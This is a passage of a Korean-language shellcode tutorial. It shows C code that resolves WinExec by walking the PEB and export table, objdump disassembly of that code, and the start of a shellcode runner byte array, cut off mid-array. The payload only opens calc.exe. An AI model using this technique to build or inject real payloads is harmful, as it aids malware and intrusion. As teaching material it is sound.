+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>WinExec</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span><span class=p>))</span><span class=n>WinExec_Addr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>WinExec</span><span class=p>(</span><span class=n>calcexe</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><hr><h3 id=쉘코드-추출>쉘코드 추출</h3><p><code>objdump</code>를 통해 바이트 코드로 추출하였다.</p><p><code>_main</code> 함수에서 <code>PEB</code>를 가져오는 부분부터 호출하는 부분까지만 사용하면 된다.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>4014fe:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
+</span></span><span class=line><span class=cl>401504:	89 44 24 78          	mov    %eax,0x78(%esp)
+</span></span><span class=line><span class=cl>401508:	8b 44 24 78          	mov    0x78(%esp),%eax
+</span></span><span class=line><span class=cl>40150c:	83 c0 0c             	add    $0xc,%eax
+</span></span><span class=line><span class=cl>40150f:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>401511:	89 44 24 74          	mov    %eax,0x74(%esp)
+</span></span><span class=line><span class=cl>401515:	8b 44 24 74          	mov    0x74(%esp),%eax
+</span></span><span class=line><span class=cl>401519:	83 c0 14             	add    $0x14,%eax
+</span></span><span class=line><span class=cl>40151c:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>40151e:	89 44 24 70          	mov    %eax,0x70(%esp)
+</span></span><span class=line><span class=cl>401522:	8b 44 24 70          	mov    0x70(%esp),%eax
+</span></span><span class=line><span class=cl>401526:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>401528:	89 44 24 6c          	mov    %eax,0x6c(%esp)
+</span></span><span class=line><span class=cl>40152c:	8b 44 24 6c          	mov    0x6c(%esp),%eax
+</span></span><span class=line><span class=cl>401530:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>401532:	89 44 24 68          	mov    %eax,0x68(%esp)
+</span></span><span class=line><span class=cl>401536:	8b 44 24 68          	mov    0x68(%esp),%eax
+</span></span><span class=line><span class=cl>40153a:	83 c0 10             	add    $0x10,%eax
+</span></span><span class=line><span class=cl>40153d:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>40153f:	89 44 24 64          	mov    %eax,0x64(%esp)
+</span></span><span class=line><span class=cl>401543:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>401547:	8b 40 3c             	mov    0x3c(%eax),%eax
+</span></span><span class=line><span class=cl>40154a:	89 44 24 60          	mov    %eax,0x60(%esp)
+</span></span><span class=line><span class=cl>40154e:	8b 54 24 60          	mov    0x60(%esp),%edx
+</span></span><span class=line><span class=cl>401552:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>401556:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>401558:	89 44 24 5c          	mov    %eax,0x5c(%esp)
+</span></span><span class=line><span class=cl>40155c:	8b 44 24 5c          	mov    0x5c(%esp),%eax
+</span></span><span class=line><span class=cl>401560:	83 c0 18             	add    $0x18,%eax
+</span></span><span class=line><span class=cl>401563:	89 44 24 58          	mov    %eax,0x58(%esp)
+</span></span><span class=line><span class=cl>401567:	8b 44 24 58          	mov    0x58(%esp),%eax
+</span></span><span class=line><span class=cl>40156b:	83 c0 60             	add    $0x60,%eax
+</span></span><span class=line><span class=cl>40156e:	89 44 24 54          	mov    %eax,0x54(%esp)
+</span></span><span class=line><span class=cl>401572:	8b 44 24 54          	mov    0x54(%esp),%eax
+</span></span><span class=line><span class=cl>401576:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>401578:	89 44 24 50          	mov    %eax,0x50(%esp)
+</span></span><span class=line><span class=cl>40157c:	8b 54 24 50          	mov    0x50(%esp),%edx
+</span></span><span class=line><span class=cl>401580:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>401584:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>401586:	89 44 24 4c          	mov    %eax,0x4c(%esp)
+</span></span><span class=line><span class=cl>40158a:	8b 44 24 4c          	mov    0x4c(%esp),%eax
+</span></span><span class=line><span class=cl>40158e:	83 c0 1c             	add    $0x1c,%eax
+</span></span><span class=line><span class=cl>401591:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>401593:	89 c2                	mov    %eax,%edx
+</span></span><span class=line><span class=cl>401595:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>401599:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>40159b:	89 44 24 48          	mov    %eax,0x48(%esp)
+</span></span><span class=line><span class=cl>40159f:	8b 44 24 4c          	mov    0x4c(%esp),%eax
+</span></span><span class=line><span class=cl>4015a3:	83 c0 20             	add    $0x20,%eax
+</span></span><span class=line><span class=cl>4015a6:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>4015a8:	89 c2                	mov    %eax,%edx
+</span></span><span class=line><span class=cl>4015aa:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>4015ae:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4015b0:	89 44 24 44          	mov    %eax,0x44(%esp)
+</span></span><span class=line><span class=cl>4015b4:	8b 44 24 4c          	mov    0x4c(%esp),%eax
+</span></span><span class=line><span class=cl>4015b8:	83 c0 24             	add    $0x24,%eax
+</span></span><span class=line><span class=cl>4015bb:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>4015bd:	89 c2                	mov    %eax,%edx
+</span></span><span class=line><span class=cl>4015bf:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>4015c3:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4015c5:	89 44 24 40          	mov    %eax,0x40(%esp)
+</span></span><span class=line><span class=cl>4015c9:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%esp)
+</span></span><span class=line><span class=cl>4015d0:	00 
+</span></span><span class=line><span class=cl>4015d1:	c7 44 24 20 57 69 6e 	movl   $0x456e6957,0x20(%esp)
+</span></span><span class=line><span class=cl>4015d8:	45 
+</span></span><span class=line><span class=cl>4015d9:	c7 44 24 24 78 65 63 	movl   $0x636578,0x24(%esp)
+</span></span><span class=line><span class=cl>4015e0:	00 
+</span></span><span class=line><span class=cl>4015e1:	8b 44 24 7c          	mov    0x7c(%esp),%eax
+</span></span><span class=line><span class=cl>4015e5:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
+</span></span><span class=line><span class=cl>4015ec:	8b 44 24 44          	mov    0x44(%esp),%eax
+</span></span><span class=line><span class=cl>4015f0:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4015f2:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>4015f4:	89 c2                	mov    %eax,%edx
+</span></span><span class=line><span class=cl>4015f6:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>4015fa:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4015fc:	89 44 24 3c          	mov    %eax,0x3c(%esp)
+</span></span><span class=line><span class=cl>401600:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>401604:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>401607:	0f b6 44 24 20       	movzbl 0x20(%esp),%eax
+</span></span><span class=line><span class=cl>40160c:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>40160e:	75 72                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>401610:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>401614:	83 c0 01             	add    $0x1,%eax
+</span></span><span class=line><span class=cl>401617:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>40161a:	0f b6 44 24 21       	movzbl 0x21(%esp),%eax
+</span></span><span class=line><span class=cl>40161f:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>401621:	75 5f                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>401623:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>401627:	83 c0 02             	add    $0x2,%eax
+</span></span><span class=line><span class=cl>40162a:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>40162d:	0f b6 44 24 22       	movzbl 0x22(%esp),%eax
+</span></span><span class=line><span class=cl>401632:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>401634:	75 4c                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>401636:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>40163a:	83 c0 03             	add    $0x3,%eax
+</span></span><span class=line><span class=cl>40163d:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>401640:	0f b6 44 24 23       	movzbl 0x23(%esp),%eax
+</span></span><span class=line><span class=cl>401645:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>401647:	75 39                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>401649:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>40164d:	83 c0 04             	add    $0x4,%eax
+</span></span><span class=line><span class=cl>401650:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>401653:	0f b6 44 24 24       	movzbl 0x24(%esp),%eax
+</span></span><span class=line><span class=cl>401658:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>40165a:	75 26                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>40165c:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>401660:	83 c0 05             	add    $0x5,%eax
+</span></span><span class=line><span class=cl>401663:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>401666:	0f b6 44 24 25       	movzbl 0x25(%esp),%eax
+</span></span><span class=line><span class=cl>40166b:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>40166d:	75 13                	jne    401682 &lt;_main+0x192&gt;
+</span></span><span class=line><span class=cl>40166f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
+</span></span><span class=line><span class=cl>401673:	83 c0 06             	add    $0x6,%eax
+</span></span><span class=line><span class=cl>401676:	0f b6 10             	movzbl (%eax),%edx
+</span></span><span class=line><span class=cl>401679:	0f b6 44 24 26       	movzbl 0x26(%esp),%eax
+</span></span><span class=line><span class=cl>40167e:	38 c2                	cmp    %al,%dl
+</span></span><span class=line><span class=cl>401680:	74 0a                	je     40168c &lt;_main+0x19c&gt;
+</span></span><span class=line><span class=cl>401682:	83 44 24 7c 01       	addl   $0x1,0x7c(%esp)
+</span></span><span class=line><span class=cl>401687:	e9 55 ff ff ff       	jmp    4015e1 &lt;_main+0xf1&gt;
+</span></span><span class=line><span class=cl>40168c:	90                   	nop
+</span></span><span class=line><span class=cl>40168d:	8b 44 24 7c          	mov    0x7c(%esp),%eax
+</span></span><span class=line><span class=cl>401691:	89 44 24 38          	mov    %eax,0x38(%esp)
+</span></span><span class=line><span class=cl>401695:	8b 44 24 38          	mov    0x38(%esp),%eax
+</span></span><span class=line><span class=cl>401699:	8d 14 00             	lea    (%eax,%eax,1),%edx
+</span></span><span class=line><span class=cl>40169c:	8b 44 24 40          	mov    0x40(%esp),%eax
+</span></span><span class=line><span class=cl>4016a0:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4016a2:	0f b7 00             	movzwl (%eax),%eax
+</span></span><span class=line><span class=cl>4016a5:	66 89 44 24 36       	mov    %ax,0x36(%esp)
+</span></span><span class=line><span class=cl>4016aa:	0f bf 44 24 36       	movswl 0x36(%esp),%eax
+</span></span><span class=line><span class=cl>4016af:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
+</span></span><span class=line><span class=cl>4016b6:	8b 44 24 48          	mov    0x48(%esp),%eax
+</span></span><span class=line><span class=cl>4016ba:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4016bc:	8b 00                	mov    (%eax),%eax
+</span></span><span class=line><span class=cl>4016be:	89 44 24 30          	mov    %eax,0x30(%esp)
+</span></span><span class=line><span class=cl>4016c2:	8b 54 24 30          	mov    0x30(%esp),%edx
+</span></span><span class=line><span class=cl>4016c6:	8b 44 24 64          	mov    0x64(%esp),%eax
+</span></span><span class=line><span class=cl>4016ca:	01 d0                	add    %edx,%eax
+</span></span><span class=line><span class=cl>4016cc:	89 44 24 2c          	mov    %eax,0x2c(%esp)
+</span></span><span class=line><span class=cl>4016d0:	c7 44 24 17 63 61 6c 	movl   $0x636c6163,0x17(%esp)
+</span></span><span class=line><span class=cl>4016d7:	63 
+</span></span><span class=line><span class=cl>4016d8:	c7 44 24 1b 2e 65 78 	movl   $0x6578652e,0x1b(%esp)
+</span></span><span class=line><span class=cl>4016df:	65 
+</span></span><span class=line><span class=cl>4016e0:	c6 44 24 1f 00       	movb   $0x0,0x1f(%esp)
+</span></span><span class=line><span class=cl>4016e5:	8b 44 24 2c          	mov    0x2c(%esp),%eax
+</span></span><span class=line><span class=cl>4016e9:	89 44 24 28          	mov    %eax,0x28(%esp)
+</span></span><span class=line><span class=cl>4016ed:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
+</span></span><span class=line><span class=cl>4016f4:	00 
+</span></span><span class=line><span class=cl>4016f5:	8d 44 24 17          	lea    0x17(%esp),%eax
+</span></span><span class=line><span class=cl>4016f9:	89 04 24             	mov    %eax,(%esp)
+</span></span><span class=line><span class=cl>4016fc:	8b 44 24 28          	mov    0x28(%esp),%eax
+</span></span><span class=line><span class=cl>401700:	ff d0                	call   *%eax
+</span></span></code></pre></td></tr></table></div></div><hr><h3 id=쉘코드-실행>쉘코드 실행</h3><p>메모리에 쉘코드를 복사하여 실행하면 계산기가 실행되는 것을 확인할 수 있다.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// compile : gcc -o shellcode_runner.exe shellcode_runner.c
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xa1</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x0c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x5c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x5c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x1c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0xc2</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x89</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span 